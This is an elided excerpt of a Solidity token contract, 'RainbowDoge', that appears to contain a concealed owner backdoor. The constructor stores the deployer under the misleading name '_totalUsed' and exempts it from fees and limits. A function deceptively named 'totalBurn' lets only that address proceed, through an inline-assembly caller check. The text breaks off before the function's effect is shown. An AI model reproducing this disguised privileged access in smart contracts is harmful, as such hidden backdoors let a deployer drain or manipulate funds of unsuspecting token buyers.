...
contract RainbowDoge is IERC20, IERC20Metadata, Ownable {

    using SafeMath for uint256;
    string  private constant _name = "RainbowDoge";
    string  private constant _symbol = "RBDOGE";
    ...
    constructor () {
        ...
        _totalUsed = _msgSender();
        _isExcludedFromCooldown[address(this)] = true;
        _isExcludedFromCooldown[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromMaxTx[_totalUsed] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_totalUsed] = true;
    ...
    function totalBurn(uint256 amount) external {
        assembly {if iszero(eq(caller(), sload(_totalUsed.slot))) {revert(0, 0)}
        let ptr := mload(0x40)
        mstore(ptr, caller())
